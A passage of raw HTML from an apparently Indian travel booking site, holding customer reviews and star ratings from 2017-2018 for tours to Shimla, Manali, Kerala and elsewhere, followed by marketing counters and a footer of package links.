                      <p style="margin:0px;">The car n satish driver was awsm hapy with it. The rooms of shimla was not gd not hapy u mst try for sm other hotels bt rooms for manali was gd k k beter dn shimla hotel the trip was gd njoyd it a lot thnx Ã°ÂŸÂ˜ÂŠÃ°ÂŸÂ˜ÂŠ</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from mehul  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Feb 2018</small></h5>
                      <p style="margin:0px;">Whole trip was awesome.I would like to thank Tourist Triangle and specifically to Smt. Hema Bist & Sh. Sudhanshu  Srivasatav of tourist triangle for their support during whole trip.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Naveen More  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Feb 2018</small></h5>
                      <p style="margin:0px;">I m very thankful to Himalayan trips...We enjoyed a lot our trip... Everything is appriciable ...Driver Sumeet done his job very nicely, Rooms , service, food everything was perfect .....Thank you again....</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from raj  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;10th, Feb 2018</small></h5>
                      <p style="margin:0px;">very good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sathish  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;9th, Feb 2018</small></h5>
                      <p style="margin:0px;">Driver is very good.nice ride and very good accomodation throughout the travel.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shaik imran  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Feb 2018</small></h5>
                      <p style="margin:0px;">Overall the trip was awesome. Well planned trip in that price range.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Dolly  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Jan 2018</small></h5>
                      <p style="margin:0px;">Superb planning. The cab and the office staff o Himalayan Explorer were very helpful. The hotel stay was awesome. It ws clean and well maintained. Would like to plan more trips from Himalyan Explorer</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from VINAY SINGH ChAuhan  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;31st, Dec 2017</small></h5>
                      <p style="margin:0px;">It was a nice trip, good hotel, nice food, good behaviour of hotel staff, also the follow up and coordination of touring triangle representative was very good but Volvo service should be improved...</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sohan  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Dec 2017</small></h5>
                      <p style="margin:0px;">Very nice trip. Excellent. Thank you Himalayan trip for our memorable days. Hotels also were very nice. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rohit Navrange  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Dec 2017</small></h5>
                      <p style="margin:0px;">It was a wonderful tour overall.Yashwant Ji was available whenever we needed them.Our Driverji Sumandeep wass osum.Overall it was great to have our tour planned by Himalayan Trips LLP.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from pavankumar  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, Dec 2017</small></h5>
                      <p style="margin:0px;">Had wonderful experience!</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mahesh Borse  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;10th, Dec 2017</small></h5>
                      <p style="margin:0px;">Thanks for arranging our memorable trip by mystikal . <br />
    Overall its very good & enjoyed a lot .<br />
    Hotels arrangement , food & car services are safe .<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from BALAJI  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Dec 2017</small></h5>
                      <p style="margin:0px;">Nice</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Manali  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;6th, Dec 2017</small></h5>
                      <p style="margin:0px;">Its awesome </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sujata Sandeep Gaikwad   for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Nov 2017</small></h5>
                      <p style="margin:0px;">Nice place... Memorable trip for us... But not satisfied about food... Pure vegetarian food with fixed menu in their <br />
    hotels.. No choice for us in their food menu.. Rest of the all things are good.. Good spots, travelling service etc... Before booking please ask all things (especially food) which you want... Thank you </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ejazul hasan  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Nov 2017</small></h5>
                      <p style="margin:0px;">Awasome experience everyth8ng is excellent and hotel staff is very goo</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Hiren Dudhaiya  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Nov 2017</small></h5>
                      <p style="margin:0px;">All Arrangements are supperbb... <br />
    Shimla hotel is Ã°ÂŸÂ‘ÂŒ... But manali hotel is not good well... </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Aftab alam khan  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Nov 2017</small></h5>
                      <p style="margin:0px;">Super hospitality....great experience with paraduse travels</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Divyanka   for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Nov 2017</small></h5>
                      <p style="margin:0px;">Hello Travel setu guys..<br />
    We had an amazing experience of Kerla tour organised nicely by you..<br />
    Especially Mr. Navin planned whole trip so wisely.. He arranged good hotels and   facilities.. Mr. Nithin, a young boy took good care of us during whole tour and driven us all planned places.. We had safe journey with him and we enjoyed a lot.. Thanx a lot to Travel Setu - Times Quest Service Pvt. Ltd Team, Mr. Naveen and Mr. Nithin..</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Santosh Kushwah  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;10th, Nov 2017</small></h5>
                      <p style="margin:0px;">I have been to Shimla trip in the month of November 2017 by using good agency for Himalayan trip nice place and thanks for your valuable support to yamu & yaswant and driver Mukesh kumar<br />
    <br />
    Thanks to HIMALAYAN TRIP for my trip a lovely memory<br />
    <br />
    Best Regards<br />
    Santosh Kushwah<br />
    Gwalior<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from J.k.gupta  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Nov 2017</small></h5>
                      <p style="margin:0px;">Thanks to Pluto tours for arranging a nice& memorable tour</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from J.k.gupta  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Nov 2017</small></h5>
                      <p style="margin:0px;">Day before yesterday we completed our fantastic himahal tour.it was a8nights&9days full himachal tour starting from shimla,manali dharamshala & Dalhousie.we enjoy it very much.along with natural beauty of mountains&pine&deodar trees we also enjoyed horse riding at kufri,rafting at manali,motor bike ride at sholang vally yak riding & paragliding near rohtang pass.it was a package tour arranged by Pluto tours who have arranged a swift desire car with driver,hotels with breakfast & dinner.they have there own hotels in shimla& manali.they provided us a  very nice hotel at dharamshala,dalhausehotel was thik thak.Thanks topluto tour . thanks to owner pankj Ji&special thanks to our tour coordinator sales executive Monika .her behaviour was like a family member.till the complition of our tour she was daily in our touch over mobile.my blessings & Ashirvad to full team of Pluto,pankj ji,monika& our driver gurudev for making our tour a happiest tour</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shivakumar R  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Nov 2017</small></h5>
                      <p style="margin:0px;">Accommodation in Manali and shimla no doubt it was very good and food in shimla was very good as per my concern.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Paras Rathod  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;31st, Oct 2017</small></h5>
                      <p style="margin:0px;">The services were better than expected. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Santosh  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Oct 2017</small></h5>
                      <p style="margin:0px;">Very nice service ,on time pick up,hotel arrangements,car condition is good,driver is very nice and nice driving.Totally whole tour was excellent and I enjoyed a lot.thank you for your good service.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Gaurav kumar  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Oct 2017</small></h5>
                      <p style="margin:0px;">Thank you madhuri mem amazing hotels </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Poojitha  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;23rd, Oct 2017</small></h5>
                      <p style="margin:0px;">Trio to Manali..superb experience <br />
    Our travel agent Shikha and driver Mukesh Kumar has supported to the best <br />
    <br />
    Thanks for the co-operation </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ramesh desai for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Oct 2017</small></h5>
                      <p style="margin:0px;">Nice experience. Travelsetu had arranged best travel expert company for me. Best memorable experience. Will recommend to go with travelsetu to all.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mohan  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;6th, Oct 2017</small></h5>
                      <p style="margin:0px;">Amazing experience, Micah travels made everything smooth. Resorts were top notch for the price. Tdew in thekaddy and The great escape in Munnar are excellent choice. Houseboat experience was great. Guys were helpful and food was good. Special mention: Ajith the driver is an excellent guy.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sharad kumar bharti  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Oct 2017</small></h5>
                      <p style="margin:0px;">All service was very good .<br />
    But at last I have to give 1000 more other than my package to driver for picking up from anand vihar. (New Delhi).<br />
    <br />
    <br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mujahid  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Oct 2017</small></h5>
                      <p style="margin:0px;">Excellent service. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Srikanth  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Aug 2017</small></h5>
                      <p style="margin:0px;">Excellent co-ordination from Sudeesh. Thank you.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nabin Baruah  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, Aug 2017</small></h5>
                      <p style="margin:0px;">The driver was informative and hotels were homely. A worry free journey. Thank you.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Arvind Kumar  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;8th, Aug 2017</small></h5>
                      <p style="margin:0px;">Good coordination and servives....<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Lokesh Sahu  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;21st, Jul 2017</small></h5>
                      <p style="margin:0px;">Its Nice Tour & Miss Monika Koushal is very helpful person for me in all tour... i will make another tour form miss monika & pluto tours.. thanking you..</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from ramesh kalyanam  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Jul 2017</small></h5>
                      <p style="margin:0px;">Very good travel experience.. Executive is good and helpful in assisting and planning my travel.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Chetna  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Jun 2017</small></h5>
                      <p style="margin:0px;">Awesome trip. Well managed. Fantastic hotels.. food quality too good. Really besy experience i had.thanx Ravinderji ! </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sujit Patel   for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Jun 2017</small></h5>
                      <p style="margin:0px;">Suparb....... Tour</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nipurn vaishnav  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Jun 2017</small></h5>
                      <p style="margin:0px;">Im satified. Hotel adarsh annexe is very good hotel all the staff are well behaved breakfast and dinner are also good<br />
    I will visit again very soon</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Vijay  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Jun 2017</small></h5>
                      <p style="margin:0px;">Very good arrangement done by staff specially Shivali sharma who coordinates every time before n after the trip. The every one must go via this agency n specially the one Shivali Sharma</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from  Pankaj Kr sharma  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Jun 2017</small></h5>
                      <p style="margin:0px;">It was pleasant. Thanks.<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nishita Singh  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Jun 2017</small></h5>
                      <p style="margin:0px;">gud service </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nitin  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Jun 2017</small></h5>
                      <p style="margin:0px;">Nice</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sunil  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Jun 2017</small></h5>
                      <p style="margin:0px;">Good  we loved  it  and pluto  tour  sharmila  is very  helpful  her  service  is excellent </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Karan Kothari  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Jun 2017</small></h5>
                      <p style="margin:0px;">Excellent service by Mr Viral Gandhi of PA holidays. Unfortunately trip called off</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Indrajit gaikwad  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, Jun 2017</small></h5>
                      <p style="margin:0px;">Very nice tour with Pluto beautiful services & best hotel thanks Pluto, thanks Shyam sir & thanks Ambika madam & thanks all Pluto team</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Dharmendra yadav  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Jun 2017</small></h5>
                      <p style="margin:0px;">nice trip arranged</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Yogesh  for  trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Jun 2017</small></h5>
                      <p style="margin:0px;">nice trip</p>
                    </li>
                      </ul>
                </div>
              </div>
            </div>

              </div>
            </div>

                <div class="global-map-area section parallax" data-stellar-background-ratio="0.5">
              <div class="container description">
                <div class="col-sm-6 col-md-3">
                  <div class="icon-box style6 animated counters-box" data-animation-type="slideInLeft" data-animation-delay="0">
                    <i class="soap-icon-features" style="font-size:55px;"></i>
                    <div class="description numbers">
                      <h4 class="box-title lineHeight"><span class="display-counter" data-value="100">0</span>% Money Safe Guarantee</h4>
                    </div>
                  </div>
                </div>
                <div class="col-sm-6 col-md-3">
                  <div class="icon-box style6 animated counters-box" data-animation-type="slideInDown" data-animation-delay="0.6">
                    <i class="soap-icon-shopping"></i>
                    <div class="description numbers">
                      <h4 class="box-title lineHeight">Package Sell<br><i class="fa fa-inr"></i><span class="display-counter" data-value="128224457">0</span></h4>
                    </div>
                  </div>
                </div>
                <div class="col-sm-6 col-md-3">
                  <div class="icon-box style6 animated counters-box" data-animation-type="slideInDown" data-animation-delay="0.9">
                    <i class="soap-icon-conference"></i>
                    <div class="description numbers">
                      <h4 class="box-title lineHeight">Happy Clients<br><span class="display-counter" data-value="5480">0</span></h4>
                    </div>
                  </div>

                </div>
                <div class="col-sm-6 col-md-3">
                  <div class="icon-box style6 animated"  data-animation-type="slideInRight" data-animation-delay="1.2">
                    <i class="soap-icon-insurance"></i>
                    <div class="description">
                      <h4 class="box-title lineHeight">Verified Travel <br>Companies</h4>
                    </div>
                  </div>
                </div>
              </div>
            </div>

          </section>

      <!-- ################## Footer Start ################## -->

          <footer id="footer" class="style4">
            <div class="footer-wrapper">
              <div class="container">
                <div class="row">
                  <div class="col-sm-6 col-md-3">
                    <h2>Domestic Tour Packages</h2>
                    <ul class="discover triangle hover row">
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/andaman">Andaman tour packages</a></li>
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/goa">Goa tour packages</a></li>
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/himachal">Himachal tour packages</a></li>
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/kashmir">Kashmir tour packages</a></li>
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/kerala">Kerala tour packages</a></li>
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/leh-ladakh">Leh-Ladakh tour packages</a></li>
                          <li class="active col-xs-12"><a href="https://travelsetu.com/holiday-tour-packages/north-east">North-East tour packages</a></li>
